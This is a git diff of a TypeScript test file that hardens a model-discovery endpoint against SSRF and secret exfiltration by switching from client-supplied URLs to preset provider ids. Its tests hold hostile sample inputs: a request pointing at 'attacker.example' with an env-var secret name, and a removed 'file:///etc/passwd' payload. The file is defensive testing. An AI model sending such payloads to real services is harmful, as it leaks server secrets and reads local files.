@@ -673,7 +673,7 @@ describe('Input validation with Zod', { timeout: 15000 }, () => {
       json: async () => body,
     });
 
-    it('returns the model list from a successful /v1/models probe', async () => {
+    it('resolves the base URL from the preset id and returns the model list', async () => {
       const fetchMock = vi.fn().mockResolvedValue(
         okResponse({
           data: [{ id: 'llama3:8b' }, { id: 'mistral:7b' }],
@@ -684,7 +684,7 @@ describe('Input validation with Zod', { timeout: 15000 }, () => {
       const response = await app.inject({
         method: 'POST',
         url: '/api/providers/discover-models',
-        payload: { baseUrl: 'http://localhost:11434/v1' },
+        payload: { id: 'ollama' },
       });
 
       expect(response.statusCode).toBe(200);
@@ -694,9 +694,10 @@ describe('Input validation with Zod', { timeout: 15000 }, () => {
           { id: 'mistral:7b', name: 'mistral:7b' },
         ],
       });
+      // Base URL comes from the preset, not the client.
       expect(fetchMock).toHaveBeenCalledWith(
         'http://localhost:11434/v1/models',
-        expect.objectContaining({ headers: {} }),
+        expect.objectContaining({ signal: expect.anything() }),
       );
     });
 
@@ -716,7 +717,7 @@ describe('Input validation with Zod', { timeout: 15000 }, () => {
       const response = await app.inject({
         method: 'POST',
         url: '/api/providers/discover-models',
-        payload: { baseUrl: 'http://localhost:11434/v1' },
+        payload: { id: 'ollama' },
       });
 
       expect(response.statusCode).toBe(200);
@@ -730,31 +731,31 @@ describe('Input validation with Zod', { timeout: 15000 }, () => {
       const response = await app.inject({
         method: 'POST',
         url: '/api/providers/discover-models',
-        payload: { baseUrl: 'http://localhost:11434/v1' },
+        payload: { id: 'ollama' },
       });
 
       expect(response.statusCode).toBe(200);
       expect(response.json()).toEqual({ models: [] });
     });
 
-    it('strips a trailing slash before appending /models', async () => {
+    it('resolves the LM Studio preset base URL', async () => {
       const fetchMock = vi.fn().mockResolvedValue(okResponse({ data: [] }));
       installFetch(fetchMock as unknown as typeof globalThis.fetch);
 
       const response = await app.inject({
         method: 'POST',
         url: '/api/providers/discover-models',
-        payload: { baseUrl: 'http://localhost:11434/v1/' },
+        payload: { id: 'lmstudio' },
       });
 
       expect(response.statusCode).toBe(200);
       expect(fetchMock).toHaveBeenCalledWith(
-        'http://localhost:11434/v1/models',
+        'http://localhost:1234/v1/models',
         expect.any(Object),
       );
     });
 
-    it('returns 400 when baseUrl is missing', async () => {
+    it('returns 400 when id is missing', async () => {
       const response = await app.inject({
         method: 'POST',
         url: '/api/providers/discover-models',
@@ -764,14 +765,71 @@ describe('Input validation with Zod', { timeout: 15000 }, () => {
       expect(response.statusCode).toBe(400);
     });
 
-    it('returns 400 when baseUrl is not http(s)', async () => {
+    it('returns 400 for an unknown provider id', async () => {
       const response = await app.inject({
         method: 'POST',
         url: '/api/providers/discover-models',
-        payload: { baseUrl: 'file:///etc/passwd' },
+        payload: { id: 'not-a-provider' },
       });
 
       expect(response.statusCode).toBe(400);
+    });
+
+    it('returns 400 for a non-local provider id (discovery is local-only)', async () => {
+      const fetchMock = vi.fn().mockResolvedValue(okResponse({ data: [] }));
+      installFetch(fetchMock as unknown as typeof globalThis.fetch);
+
+      const response = await app.inject({
+        method: 'POST',
+        url: '/api/providers/discover-models',
+        payload: { id: 'openai' },
+      });
+
+      expect(response.statusCode).toBe(400);
+      // Must not probe the cloud provider's endpoint. (The shared global fetch
+      // also sees unrelated MCP-client traffic, so assert on the URL, not the
+      // total call count.)
+      const probedOpenAi = fetchMock.mock.calls.some(([u]) =>
+        String(u).includes('api.openai.com'),
+      );
+      expect(probedOpenAi).toBe(false);
+    });
+
+    it('does not read process.env or send an Authorization header (no secret exfiltration)', async () => {
+      process.env['TEST_DISCOVERY_SECRET'] = 'super-secret';
+      const fetchMock = vi.fn().mockResolvedValue(okResponse({ data: [] }));
+      installFetch(fetchMock as unknown as typeof globalThis.fetch);
+
+      try {
+        const response = await app.inject({
+          method: 'POST',
+          url: '/api/providers/discover-models',
+          // A malicious client tries the old shape: arbitrary baseUrl + env var.
+          payload: {
+            id: 'ollama',
+            baseUrl: 'https://attacker.example/v1',
+            apiKeyEnv: 'TEST_DISCOVERY_SECRET',
+          },
+        });
+
+        expect(response.statusCode).toBe(200);
+        // Extra fields are ignored. The server must NOT probe the
+        // client-supplied attacker URL, and the real probe (the preset's
+        // localhost URL) must carry no Authorization header — so the env
+        // secret never leaves the process. (Filter by URL: the shared global
+        // fetch also sees unrelated MCP-client traffic.)
+        const probedAttacker = fetchMock.mock.calls.some(([u]) =>
+          String(u).includes('attacker.example'),
+        );
+        expect(probedAttacker).toBe(false);
+        const probe = fetchMock.mock.calls.find(
+          ([u]) => u === 'http://localhost:11434/v1/models',
+        );
+        expect(probe).toBeDefined();
+        expect((probe![1] as { headers?: unknown }).headers).toBeUndefined();
+      } finally {
+        delete process.env['TEST_DISCOVERY_SECRET'];
+      }
     });
 
     it('returns 502 when the provider responds with non-2xx', async () => {
@@ -786,7 +844,7 @@ describe('Input validation with Zod', { timeout: 15000 }, () => {
       const response = await app.inject({
         method: 'POST',
         url: '/api/providers/discover-models',
-        payload: { baseUrl: 'http://localhost:11434/v1' },
+        payload: { id: 'ollama' },
       });
 
       expect(response.statusCode).toBe(502);
@@ -802,58 +860,11 @@ describe('Input validation with Zod', { timeout: 15000 }, () => {
       const response = await app.inject({
         method: 'POST',
         url: '/api/providers/discover-models',
-        payload: { baseUrl: 'http://localhost:11434/v1' },
+        payload: { id: 'ollama' },
       });
 
       expect(response.statusCode).toBe(502);
       expect(response.json().message).toContain('ECONNREFUSED');
-    });
-
-    it('sends a Bearer Authorization header when apiKeyEnv is set and present', async () => {
-      process.env['TEST_DISCOVERY_KEY'] = 'sk-test-123';
-      const fetchMock = vi.fn().mockResolvedValue(okResponse({ data: [] }));
-      installFetch(fetchMock as unknown as typeof globalThis.fetch);
-
-      try {
-        const response = await app.inject({
-          method: 'POST',
-          url: '/api/providers/discover-models',
-          payload: {
-            baseUrl: 'https://api.example.com/v1',
-            apiKeyEnv: 'TEST_DISCOVERY_KEY',
-          },
-        });
-
-        expect(response.statusCode).toBe(200);
-        expect(fetchMock).toHaveBeenCalledWith(
-          'https://api.example.com/v1/models',
-          expect.objectContaining({
-            headers: { Authorization: 'Bearer sk-test-123' },
-          }),
-        );
-      } finally {
-        delete process.env['TEST_DISCOVERY_KEY'];
-      }
-    });
-
-    it('omits the Authorization header when apiKeyEnv is set but the env var is unset', async () => {
-      const fetchMock = vi.fn().mockResolvedValue(okResponse({ data: [] }));
-      installFetch(fetchMock as unknown as typeof globalThis.fetch);
-
-      const response = await app.inject({
-        method: 'POST',
-        url: '/api/providers/discover-models',
-        payload: {
-          baseUrl: 'http://localhost:11434/v1',
-          apiKeyEnv: 'OPENAIDY_TEST_UNSET_VAR',
-        },
-      });
-
-      expect(response.statusCode).toBe(200);
-      expect(fetchMock).toHaveBeenCalledWith(
-        'http://localhost:11434/v1/models',
-        expect.objectContaining({ headers: {} }),
-      );
     });
   });
 });
